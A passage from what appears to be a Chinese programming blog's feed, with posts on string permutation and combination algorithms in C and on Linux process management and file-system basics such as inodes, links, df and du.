<p>因为<code>abb</code>能得到<code>bab</code>和<code>bba</code>，而<code>bab</code>又能得到<code>bba</code>，那我们能不能第一个<code>bba</code>不求呢？ 我们有了这种思路，第一个字符<code>a</code>与第二个字符<code>b</code>交换得到<code>bab</code>，然后考虑第一个字符<code>a</code>与第三个字符<code>b</code>交换，此时由于第三个字符等于第二个字符，所以它们不再交换。再考虑<code>bab</code>，它的第二个与第三个字符交换可以得到<code>bba</code>。此时全排列生成完毕，即<code>abb</code>、<code>bab</code>、<code>bba</code>三个。</p>
<p>这样我们也得到了在全排列中去掉重复的规则：<strong>去重的全排列就是从第一个数字起每个数分别与它后面非重复出现的数字交换</strong>。用编程的话描述就是第i个数与第j个数交换时，要求[i,j)中没有与第j个数相等的数。下面给出完整代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre></td><td class="code"><pre><span class="preprocessor">#include&lt;stdio.h&gt;</span>
<span class="preprocessor">#include&lt;string&gt;</span>

<span class="comment">//交换两个字符</span>
<span class="keyword">void</span> Swap(<span class="keyword">char</span> *a ,<span class="keyword">char</span> *b)
{
	<span class="keyword">char</span> temp = *a;
	*a = *b;
	*b = temp;
}

<span class="comment">//在 str 数组中，[start,end) 中是否有与 str[end] 元素相同的</span>
<span class="keyword">bool</span> IsSwap(<span class="keyword">char</span>* str,<span class="keyword">int</span> start,<span class="keyword">int</span> end)
{
	<span class="keyword">for</span>(;start&lt;end;start++)
	{
		<span class="keyword">if</span>(str[start] == str[end])
			<span class="keyword">return</span> <span class="keyword">false</span>;
	}
	<span class="keyword">return</span> <span class="keyword">true</span>;
}

<span class="comment">//递归去重全排列，start 为全排列开始的下标， length 为str数组的长度</span>
<span class="keyword">void</span> AllRange2(<span class="keyword">char</span>* str,<span class="keyword">int</span> start,<span class="keyword">int</span> length)
{
	<span class="keyword">if</span>(start == length-<span class="number">1</span>)
	{
		<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str);
	}
	<span class="keyword">else</span>
	{
		<span class="keyword">for</span>(<span class="keyword">int</span> i=start;i&lt;=length-<span class="number">1</span>;i++)
		{
			<span class="keyword">if</span>(IsSwap(str,start,i))
			{
				Swap(&str[start],&str[i]); 
				AllRange2(str,start+<span class="number">1</span>,length);
				Swap(&str[start],&str[i]); 
			}
		}
	}
}

<span class="keyword">void</span> Permutation(<span class="keyword">char</span>* str)
{
	<span class="keyword">if</span>(str == NULL)
		<span class="keyword">return</span>;

	AllRange2(str,<span class="number">0</span>,<span class="built_in">strlen</span>(str));
}

<span class="keyword">void</span> main()
{
	<span class="keyword">char</span> str[] = <span class="string">"abb"</span>;
	Permutation(str);
}
</pre></td></tr></table></figure>

<h2 id="全组合">全组合</h2>
<p>如果不是求字符的所有排列，而是求字符的所有组合应该怎么办呢？还是输入三个字符 a、b、c，则它们的组合有<code>a</code> <code>b</code> <code>c</code> <code>ab</code> <code>ac</code> <code>bc</code> <code>abc</code>。当然我们还是可以借鉴全排列的思路，利用问题分解的思路，最终用递归解决。不过这里介绍一种比较巧妙的思路 —— 基于位图。</p>
<p>假设原有元素 n 个，则最终组合结果是 $2^n-1$ 个。我们可以用位操作方法：假设元素原本有：a,b,c 三个，则 1 表示取该元素，0 表示不取。故取<code>a</code>则是<code>001</code>，取<code>ab</code>则是<code>011</code>。所以一共三位，每个位上有两个选择 0 和 1。而<code>000</code>没有意义，所以是$2^n-1$个结果。</p>
<p>这些结果的位图值都是 1,2…2^n-1。所以从值 1 到值 $2^n-1$ 依次输出结果：</p>
<p><code>001</code>,<code>010</code>,<code>011</code>,<code>100</code>,<code>101</code>,<code>110</code>,<code>111</code> 。对应输出组合结果为：<code>a</code>,<code>b</code>,<code>ab</code>,<code>c</code>,<code>ac</code>,<code>bc</code>,<code>abc</code>。<br>因此可以循环 1~2^n-1，然后输出对应代表的组合即可。有代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="code"><pre><span class="preprocessor">#include&lt;stdio.h&gt;</span>
<span class="preprocessor">#include&lt;string.h&gt;</span>

<span class="keyword">void</span> Combination(<span class="keyword">char</span> *str)
{
	<span class="keyword">if</span>(str == NULL)
		<span class="keyword">return</span> ;
	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);
	<span class="keyword">int</span> n = <span class="number">1</span>&lt;&lt;len;
	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)    <span class="comment">//从 1 循环到 2^len -1</span>
	{
		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len;j++)
		{
			<span class="keyword">int</span> temp = i;
			<span class="keyword">if</span>(temp & (<span class="number">1</span>&lt;&lt;j))   <span class="comment">//对应位上为1，则输出对应的字符</span>
			{
				<span class="built_in">printf</span>(<span class="string">"%c"</span>,*(str+j));
			}
		}
		<span class="built_in">printf</span>(<span class="string">"\n"</span>);
	}
}

<span class="keyword">void</span> main()
{
	<span class="keyword">char</span> str[] = <span class="string">"abc"</span>;
	Combination(str);
}
</pre></td></tr></table></figure>

<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="http://blog.csdn.net/morewindows/article/details/7370155" target="_blank" rel="external">MoreWindows-STL系列之十 全排列</a></li>
<li><a href="http://www.cnblogs.com/lifegoesonitself/p/3225803.html" target="_blank" rel="external">java 全组合 与全排列</a></li>
</ul>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>记得<a href="http://weibo.com/jeffz" target="_blank" rel="external">@老赵</a>之前在微博上吐槽说，“有的人真是毫无长进，六年前某同事不会写程序输出全排列，昨天发邮件还是问我该怎么写，这时间浪费到我都看不下去了。” 那时候就很好奇全排列到底是什么东西，到底有多难？</p>
<p>今天复习的时候终于碰到这题了，结果果然自己太渣，看了好久都没明白，代码实现又是磕磕碰碰的。所以，就把它整理成笔记加深记忆，也希望能帮到和我一样的人。</p>
<h2 id="全排列">全排列</h2>
<p>所谓全排列，就是打印出字符串中所有字符的所有排列。例如输入字符串<code>abc</code>，则打印出 a、b、c 所能排列出来的所有字符串 <code>abc</code>、<code>acb</code>、<code>bac</code>、<code>bca</code>、<code>cab</code> 和 <code>cba</code> 。</p>
<p>一般最先想到的方法是暴力循环法，即对于每一位，遍历集合中可能的元素，如果在这一位之前出现过了该元素，跳过该元素。例如对于<code>abc</code>，第一位可以是 a 或 b 或 c 。当第一位为 a 时，第二位再遍历集合，发现 a 不行，因为前面已经出现 a 了，而 b 和 c 可以。当第二位为 b 时 ， 再遍历集合，发现 a 和 b 都不行，c 可以。可以用递归或循环来实现，但是复杂度为 $O(n^n)$ 。有没有更优雅的解法呢。</p>
<p>首先考虑<code>bac</code>和<code>cba</code>这二个字符串是如何得出的。显然这二个都是<code>abc</code>中的 a 与后面两字符交换得到的。然后可以将<code>abc</code>的第二个字符和第三个字符交换得到<code>acb</code>。同理可以根据<code>bac</code>和<code>cba</code>来得<code>bca</code>和<code>cab</code>。</p>
<p>因此可以知道 <strong>全排列就是从第一个数字起每个数分别与它后面的数字交换</strong>，也可以得出这种解法每次得到的结果都是正确结果，所以复杂度为 O(n!)。找到这个规律后，递归的代码就很容易写出来了：<br>]]></summary>
    
      <category term="全排列" scheme="http://wuchong.me/tags/%E5%85%A8%E6%8E%92%E5%88%97/"/>
    
      <category term="全组合" scheme="http://wuchong.me/tags/%E5%85%A8%E7%BB%84%E5%90%88/"/>
    
      <category term="面试" scheme="http://wuchong.me/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux基础：进程管理]]></title>
    <link href="http://wuchong.me/blog/2014/07/24/linux-process-manage/"/>
    <id>http://wuchong.me/blog/2014/07/24/linux-process-manage/</id>
    <published>2014-07-24T03:48:11.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>进程是操作系统上非常重要的概念，所有系统上面跑的数据都会以进程的类型存在。在 Linux 系统当中：触发任何一个事件时，系统都会将它定义成为一个进程，并且给予这个进程一个 ID，称为 PID，同时根据触发这个进程的用户，给予这个 PID 一组有效的权限设置。</p>
<h2 id="进程是什么样的">进程是什么样的</h2>
<p>程序运行起来后，我们看不到也摸不着。因此 Linux 为我们提供了一系列方便的命名来查看正在运行的进程。首先是 ps 命令，比如 <code>ps -l</code>命令能查看当前 bash 下的相关进程全部信息。如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
</pre></td><td class="code"><pre>$ ps -l
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          <span class="typename">TIME</span> CMD
<span class="number">0</span> S  <span class="number">1000</span>  <span class="number">2552</span>  <span class="number">2538</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> -  <span class="number">1945</span> <span class="keyword">wait</span>   pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> bash
<span class="number">0</span> S  <span class="number">1000</span>  <span class="number">9352</span>  <span class="number">2552</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> -  <span class="number">1926</span> <span class="keyword">wait</span>   pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> bash
<span class="number">0</span> R  <span class="number">1000</span>  <span class="number">9478</span>  <span class="number">9352</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> -  <span class="number">1598</span> -      pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> ps
</pre></td></tr></table></figure><br><a id="more"></a><br>另外，我们还可以用 <code>pstree</code> 命令来显示整棵进程树。<br><br><img src="http://ww3.sinaimg.cn/large/81b78497jw1einn18zdbaj20k50bign9.jpg" alt=""><br><br>可以看到这里 init 进程是所有进程的根节点，使用<code>ps</code>命令还能看到 init 的 PID 为 1 。当<a href="http://wuchong.me/blog/2014/07/14/linux-boot-process/" target="_blank" rel="external">Linux启动</a>的时候，init 是系统创建的第一个进程，这一进程会一直存在，直到我们关闭计算机。所有其他的进程都是由 init 进程衍生出来的。<br><br>##父进程 &amp; 子进程<br><br>上面提到所谓的“衍生出来的进程”正是 Linux 的父子进程的概念。当我们登录系统后，会取得一个 bash shell，然后我们利用这个 bash 提供的接口去执行另一个命令，例如 <code>bash</code> 或者 <code>ps</code> 等。那些另外执行的命令也会被触发成为 PID，那个后来执行的命令产生的 PID 就是“子进程”，而原本的 bash 环境下，就称为“父进程”了。<br><br>老进程成为新进程的父进程（parent process），而相应的，新进程就是老的进程的子进程（child process）。一个进程除了有一个PID之外，还会有一个PPID（parent PID）来存储的父进程 PID。如果我们循着 PPID 不断向上追溯的话，总会发现其源头是 init 进程。所以说，所有的进程也构成一个以 init 为根的树状结构。<br><br>我们使用 <code>ps -o</code> 命令来看一看现有的进程。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
</pre></td><td class="code"><pre><span class="variable">$ </span>ps -o pid,ppid,comm
 <span class="constant">PID</span>  <span class="constant">PPID</span> <span class="constant">COMMAND</span>
<span class="number">2552</span>  <span class="number">2538</span> bash
<span class="number">9352</span>  <span class="number">2552</span> bash
<span class="number">9625</span>  <span class="number">9352</span> ps
</pre></td></tr></table></figure>

<p>我所做的操作是在原来的 bash shell 中执行了 bash 命令，然后又执行了 ps 命令。我们可以看到，第二个进程 bash 是第一个进程 bash 的子进程，而第三个进程ps是第二个进程的子进程。</p>
<h2 id="fork_&amp;_exec">fork &amp; exec</h2>
<p>当计算机开机的时候，内核（kernel）只建立了一个 init 进程。Linux kernel 并不提供直接建立新进程的系统调用。剩下的所有进程都是 init 进程通过 fork 机制建立的。新的进程要通过老的进程复制自身得到，这就是 fork。fork 是一个系统调用。进程存活于内存中。每个进程都在内存中分配有属于自己的一片空间 (内存空间，包含栈、堆、全局静态区、文本常量区、程序代码区)。当一个程序调用 fork 的时候，实际上就是将上面的内存空间，又复制出来一个，构成一个新的进程，并在内核中为该进程创建新的附加信息 (比如新的 PID，而 PPID 为原进程的 PID)。此后，两个进程分别地继续运行下去。新的进程和原有进程有相同的运行状态(相同的变量值，相同的指令…)。我们只能通过进程的附加信息来区分两者。<br>程序调用 exec 的时候，进程清空自身的内存空间，并根据新的程序文件重建程序代码、文本常量、全局静态、堆和栈(此时堆和栈大小都为 0)，并开始运行。</p>
<h2 id="工作管理">工作管理</h2>
<p>这个工作管理（job control）是用在 bash 环境下的，也就是说，当我们登录系统取得 bash shell 之后，在单一终端机下可以同时进行多个工作的行为管理。</p>
<p>假如我们只有一个终端，因此在可以出现提示符让你操作的环境就成为前台（foreground），至于其他工作就可以放在后台（background）去暂停或运行。</p>
<p>工作管理的意义在于将多个工作囊括在一个终端，并取其中的一个工作作为前台，来直接接收该终端的输入输出以及终端信号。 其他工作在后台运行。</p>
<ul>
<li><p>直接将命令丢到后台执行：<code>&amp;</code><br>  <figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="variable">$ping</span> localhost &gt; <span class="keyword">log</span> &
</pre></td></tr></table></figure><br>  此时终端显示:<br>  <figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>[<span class="number">1</span>] <span class="number">9800</span>
</pre></td></tr></table></figure><br>  括号中的 1 表示工作号，而 9800 为 PID</p>
</li>
<li><p>将目前的工作丢到后台中“暂停”： <code>[ctrl]+z</code></p>
  <figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="variable">$vim</span> ~/.bashrc
</pre></td></tr></table></figure><br>  在vim的普通模式下，按下<code>[ctrl]+z</code>的组合键<br>  <figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>[<span class="number">2</span>]+  已停止               vim ~/<span class="preprocessor">.bashrc</span>
</pre></td></tr></table></figure></li>
<li><p>查看目前的后台工作状态：<code>jobs</code><br>  其各个参数的含义如下<br>  -l ：同时列出PID的号码<br>  -r：仅列出正在后台run的工作<br>  -s：仅列出在后台stop的工作</p>
<p>  例如我们执行<br>  <figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>$ jobs -l
[<span class="number">1</span>]-  <span class="number">9800</span> 运行中               <span class="built_in">ping</span> localhost &gt; log &
[<span class="number">2</span>]+  <span class="number">9905</span> 停止                  vim ~/<span class="preprocessor">.bashrc</span>
</pre></td></tr></table></figure><br>  能看到目前有多少个工作在后台中，并且能看到这些工作的 PID。紧跟在 job number 后面的 <code>+</code> 代表最近放到后台的工作，<code>-</code> 代表最近最后第二个放到后台的工作，直接执行<code>fg</code>的话会先取<code>+</code>的</p>
</li>
<li><p>将后台工作拿到前台来处理：<code>fg %jobnumber</code><br>  <figure class="highlight"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre><span class="variable">$cat</span> &gt; <span class="keyword">log</span> &
<span class="variable">$fg</span> <span class="variable">%1</span>
</pre></td></tr></table></figure><br>  当我们运行第一个命令后，由于工作在后台，我们无法对命令进行输入，直到我们将工作带入前台，才能向 cat 命令输入。在输入完成后，按下 CTRL+D 来通知 shell 输入结束。</p>
</li>
<li><p>让工作在后台下的状态变成运行中：<code>bg %jobnumber</code></p>
</li>
<li><p>管理后台工作中的工作：<code>kill</code><br>  信号可以通过 kill 传递给进程，信号值以下三个比较重要。<br>  -1  重新加载 （SIGHUP）<br>  -9  立刻删除 （SIGKILL）<br>  -15  正常终止（SIGTERM）</p>
<p>  可以使用<br>  <figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="variable">$kill</span> <span class="attribute">-SIGTERM</span> <span class="number">9800</span>
</pre></td></tr></table></figure><br>  或者<br>  <figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="variable">$kill</span> -<span class="number">15</span>  <span class="variable">%1</span>
</pre></td></tr></table></figure><br>  的方式来发送给工作。上面的两个命令，一个是发送给信号给 PID 9800 ，一个是发送信号值给工作号1，两者等价。</p>
</li>
<li><p>监控进程的变化：<code>top</code><br>  top 是一个很不错的程序查看工具，但不同于 ps 的静态结果输出，top 可以持续监测整个系统的进程工作状态，而且功能非常丰富，可以在 top 中输入<code>?</code>查看更多功能按键。常用的有 <code>P</code> 以CPU使用资源排序，<code>M</code>以物理内存使用排序。</p>
<p>  常用的参数有 <code>-d</code> 可以修改进程界面更新的秒数，<code>-p</code>可以指定某些个 PID 来进行查看监测。</p>
</li>
</ul>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="http://book.douban.com/subject/4889838/" target="_blank" rel="external">鸟哥的Linux私房菜.基础学习篇</a></li>
</ul>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>进程是操作系统上非常重要的概念，所有系统上面跑的数据都会以进程的类型存在。在 Linux 系统当中：触发任何一个事件时，系统都会将它定义成为一个进程，并且给予这个进程一个 ID，称为 PID，同时根据触发这个进程的用户，给予这个 PID 一组有效的权限设置。</p>
<h2 id="进程是什么样的">进程是什么样的</h2>
<p>程序运行起来后，我们看不到也摸不着。因此 Linux 为我们提供了一系列方便的命名来查看正在运行的进程。首先是 ps 命令，比如 <code>ps -l</code>命令能查看当前 bash 下的相关进程全部信息。如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
</pre></td><td class="code"><pre>$ ps -l
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          <span class="typename">TIME</span> CMD
<span class="number">0</span> S  <span class="number">1000</span>  <span class="number">2552</span>  <span class="number">2538</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> -  <span class="number">1945</span> <span class="keyword">wait</span>   pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> bash
<span class="number">0</span> S  <span class="number">1000</span>  <span class="number">9352</span>  <span class="number">2552</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> -  <span class="number">1926</span> <span class="keyword">wait</span>   pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> bash
<span class="number">0</span> R  <span class="number">1000</span>  <span class="number">9478</span>  <span class="number">9352</span>  <span class="number">0</span>  <span class="number">80</span>   <span class="number">0</span> -  <span class="number">1598</span> -      pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> ps
</pre></td></tr></table></figure><br>]]></summary>
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="进程" scheme="http://wuchong.me/tags/%E8%BF%9B%E7%A8%8B/"/>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/LinuxUnix/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux基础：文件管理]]></title>
    <link href="http://wuchong.me/blog/2014/07/21/linux-file-manage/"/>
    <id>http://wuchong.me/blog/2014/07/21/linux-file-manage/</id>
    <published>2014-07-21T09:44:19.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>在 Linux 下，所有的文件与目录都是由根目录（/）开始的。然后再一个一个分支下来，形成一棵繁杂的树。因此我们也称这种目录配置方式为“目录树”。那目录树与文件系统有什么关系，目录树是怎么实现的呢？</p>
<h2 id="目录">目录</h2>
<p>在 Linux 系统中，目录也是一种文件。我们可以使用 <code>$ls -li</code>来查看一个目录的属性。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="variable">$ls</span> <span class="attribute">-li</span>  /home/wuchong
<span class="number">141494</span>  drwxr<span class="attribute">-xr</span><span class="attribute">-x</span> <span class="number">18</span> wuchong wuchong    <span class="number">4096</span> <span class="number">12</span>月  <span class="number">2</span>  <span class="number">2013</span> hadoop<span class="subst">-</span><span class="number">1.1</span><span class="number">.1</span>
<span class="number">1715845</span> drwxrwxr<span class="attribute">-x</span>  <span class="number">2</span> wuchong wuchong    <span class="number">4096</span>  <span class="number">7</span>月 <span class="number">12</span> <span class="number">09</span>:<span class="number">07</span> input
<span class="number">1718481</span> <span class="attribute">-rw</span><span class="attribute">-rw</span><span class="attribute">-r</span><span class="subst">--</span>  <span class="number">1</span> wuchong wuchong       <span class="number">0</span>  <span class="number">7</span>月 <span class="number">12</span> <span class="number">16</span>:<span class="number">11</span> test<span class="built_in">.</span>txt
<span class="number">1718478</span> <span class="attribute">-rw</span><span class="attribute">-r</span><span class="subst">--</span>r<span class="subst">--</span>  <span class="number">1</span> root    root    <span class="number">1780292</span>  <span class="number">6</span>月 <span class="number">16</span> <span class="number">19</span>:<span class="number">04</span> etc<span class="built_in">.</span>jar<span class="built_in">.</span>bz2
……
</pre></td></tr></table></figure><br><a id="more"></a><br>其中<code>-i</code>参数是显示文件的 inode 号。可以看到第一列就是目录/文件的 inode 号。因此 ext 文件系统对于目录也会像对待文件一样分配其 inode 块和 block 块。只不过，在目录中 inode 块记录的是该目录的相关权限与属性以及分配到的 block 块号码，而 block 则记录的是这个目录下的/<strong>文件名</strong>/与该文件名占用的 inode 号码数据。<br><br>没错，在 Linux 中文件的 inode 中是不记录文件名的，文件名是记录在目录的 block 中。因此在新增/删除/重命名文件的时候，与目录的w权限有关。另一个直观的感受就是，你可以对正在使用的文件改名，换目录，甚至放到废纸篓，都不会影响当前文件的使用，这在 Windows 里是无法想象的。比如你打开个 Word 文件，然后对其进行重命名操作，Windows 会告诉你先给我关闭文件！<br><br>当我们读取一个文件时，实际上是在目录中找到了这个文件的 inode 编号，然后根据 inode 中的 block 指针，把各个 block 数据块组合起来，放入内存供进一步的处理。当我们写入一个文件时，是分配一个空白inode给该文件，将其inode编号记入该文件所属的目录，然后选取空白的数据块，让inode的指针指像这些数据块，并放入内存中的数据。<br><br>##硬链接与软链接<br>当文件出现在一个目录文件中时，我们就把文件接入到文件系统中（在目录中写入该文件的文件名和 inode 号），我们称建立一个到文件的硬链接（hard link）。一个文件允许出现在多个目录中，这样，它就有多个硬链接。当硬链接的数目（link count）降为0时，文件会被 Linux 删除。所以很多时候，unlink 与 remove 在 Linux 操作系统中是一个意思。引入硬链接的目的是为了“安全”，如果你将任何一个“文件名”删除，其实 inode 与 block 都还是存在的。此时可以通过另一个“文件名”来读取到正确的文件数据。此外，不论你使用哪个“文件名”来编辑，最终的结果都会写入到相同的 inode 与 block 中，因此均能进行数据的修改。<br><br>至于软链接（soft link），其实就是 Windows 上的快捷方式。基本上，软链接就是在创建一个新的独立的文件，而这个文件会让数据的读取指向它连接的那个文件的文件名。由于只是利用文件来作为指向的操作，所以，当源文件被删除后，软链接的文件会打不开。由于软链接（soft link）的广泛使用不会影响 link count，而且可以跨越文件系统，现在较少手动建立硬连接。<br><br><br>创建硬链接与软链接使用 ln 命令即可。<br><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="variable">$ln</span> [<span class="operator">-s</span>] 源文件 目标文件
<span class="operator">-s</span> : 如果不加任何参数就是硬链接，加上 <span class="operator">-s</span> 就是软链接

~<span class="variable">$ln</span> <span class="operator">-s</span> /etc/crontab .    
~<span class="variable">$ln</span> /etc/crontab crontab2
~$ ll -i /etc/crontab ~/crontab ~/crontab2
<span class="number">1310870</span> -rw-r--r-- <span class="number">2</span> root    root    <span class="number">722</span>  <span class="number">6</span>月 <span class="number">15</span>  <span class="number">2012</span> /etc/crontab

<span class="number">1310870</span> -rw-r--r-- <span class="number">2</span> root    root    <span class="number">722</span>  <span class="number">6</span>月 <span class="number">15</span>  <span class="number">2012</span> /home/wuchong/crontab2
<span class="number">1718696</span> lrwxrwxrwx <span class="number">1</span> wuchong wuchong  <span class="number">12</span>  <span class="number">7</span>月 <span class="number">12</span> <span class="number">16</span>:<span class="number">42</span> /home/wuchong/crontab -&gt; /etc/crontab
</pre></td></tr></table></figure>

<p>可以看到硬链接文件的 inode 是同一个，并且连接数变成了 2。而软链接是一个新的文件，拥有自己的 inode 号。</p>
<h2 id="文件系统管理命令">文件系统管理命令</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>$df  
列出文件系统的整体磁盘使用量
-<span class="ruby">h  以人们容易阅读的 <span class="constant">GB</span> <span class="constant">MB</span> <span class="constant">KB</span> 等格式自行显示
</span>-<span class="ruby">i  不使用硬盘容量，而以 inode 的数量显示
</span>
$du file/dir
评估目录所占容量
-<span class="ruby">h  以人们容易阅读的 <span class="constant">GB</span> <span class="constant">MB</span> <span class="constant">KB</span> 等格式自行显示
</span>-<span class="ruby">s  仅显示总计，不列出每个子目录的占用容量
</span>-<span class="ruby">m  以 <span class="constant">M</span> 为单位</span>
</pre></td></tr></table></figure><br>例如：<br><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>$ <span class="function_or_atom">df</span> -<span class="function_or_atom">h</span>
文件系统          容量  已用  可用  已用<span class="comment">% 挂载点</span>
/<span class="function_or_atom">dev</span>/<span class="function_or_atom">sda1</span>        <span class="number">29</span><span class="variable">G</span>  <span class="number">4.2</span><span class="variable">G</span>   <span class="number">23</span><span class="variable">G</span>   <span class="number">16</span><span class="comment">% /</span>
<span class="function_or_atom">udev</span>           <span class="number">1001</span><span class="variable">M</span>  <span class="number">4.0</span><span class="variable">K</span> <span class="number">1001</span><span class="variable">M</span>    <span class="number">1</span><span class="comment">% /dev</span>
<span class="function_or_atom">tmpfs</span>           <span class="number">404</span><span class="variable">M</span>  <span class="number">792</span><span class="variable">K</span>  <span class="number">403</span><span class="variable">M</span>    <span class="number">1</span><span class="comment">% /run</span>
<span class="function_or_atom">none</span>            <span class="number">5.0</span><span class="variable">M</span>     <span class="number">0</span>  <span class="number">5.0</span><span class="variable">M</span>    <span class="number">0</span><span class="comment">% /run/lock</span>
<span class="function_or_atom">none</span>           <span class="number">1009</span><span class="variable">M</span>  <span class="number">152</span><span class="variable">K</span> <span class="number">1009</span><span class="variable">M</span>    <span class="number">1</span><span class="comment">% /run/shm</span>
<span class="function_or_atom">none</span>            <span class="number">100</span><span class="variable">M</span>   <span class="number">28</span><span class="variable">K</span>  <span class="number">100</span><span class="variable">M</span>    <span class="number">1</span><span class="comment">% /run/user</span>
$ <span class="function_or_atom">du</span> -<span class="function_or_atom">sh</span> /<span class="function_or_atom">home</span>/<span class="function_or_atom">wuchong</span>/
<span class="number">1.1</span><span class="variable">G</span>     /<span class="function_or_atom">home</span>/<span class="function_or_atom">wuchong</span>/
</pre></td></tr></table></figure>

<h2 id="总结">总结</h2>
<p>主要概括性总结了目录文件的构成，以及与普通文件之间的关系。讲解了硬链接和软链接，以及 <code>df du</code> 命令。</p>
<p>Linux 是一个文件王国，一切都以文件的形式存在。了解 Linux 的文件系统，是深入了解操作系 Linux 原理的重要一步。</p>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="http://book.douban.com/subject/4889838/" target="_blank" rel="external">鸟哥的Linux私房菜.基础学习篇</a></li>
</ul>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>在 Linux 下，所有的文件与目录都是由根目录（/）开始的。然后再一个一个分支下来，形成一棵繁杂的树。因此我们也称这种目录配置方式为“目录树”。那目录树与文件系统有什么关系，目录树是怎么实现的呢？</p>
<h2 id="目录">目录</h2>
<p>在 Linux 系统中，目录也是一种文件。我们可以使用 <code>$ls -li</code>来查看一个目录的属性。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="variable">$ls</span> <span class="attribute">-li</span>  /home/wuchong
<span class="number">141494</span>  drwxr<span class="attribute">-xr</span><span class="attribute">-x</span> <span class="number">18</span> wuchong wuchong    <span class="number">4096</span> <span class="number">12</span>月  <span class="number">2</span>  <span class="number">2013</span> hadoop<span class="subst">-</span><span class="number">1.1</span><span class="number">.1</span>
<span class="number">1715845</span> drwxrwxr<span class="attribute">-x</span>  <span class="number">2</span> wuchong wuchong    <span class="number">4096</span>  <span class="number">7</span>月 <span class="number">12</span> <span class="number">09</span>:<span class="number">07</span> input
<span class="number">1718481</span> <span class="attribute">-rw</span><span class="attribute">-rw</span><span class="attribute">-r</span><span class="subst">--</span>  <span class="number">1</span> wuchong wuchong       <span class="number">0</span>  <span class="number">7</span>月 <span class="number">12</span> <span class="number">16</span>:<span class="number">11</span> test<span class="built_in">.</span>txt
<span class="number">1718478</span> <span class="attribute">-rw</span><span class="attribute">-r</span><span class="subst">--</span>r<span class="subst">--</span>  <span class="number">1</span> root    root    <span class="number">1780292</span>  <span class="number">6</span>月 <span class="number">16</span> <span class="number">19</span>:<span class="number">04</span> etc<span class="built_in">.</span>jar<span class="built_in">.</span>bz2
……
</pre></td></tr></table></figure><br>]]></summary>
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="文件系统" scheme="http://wuchong.me/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/LinuxUnix/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux基础：文件系统]]></title>
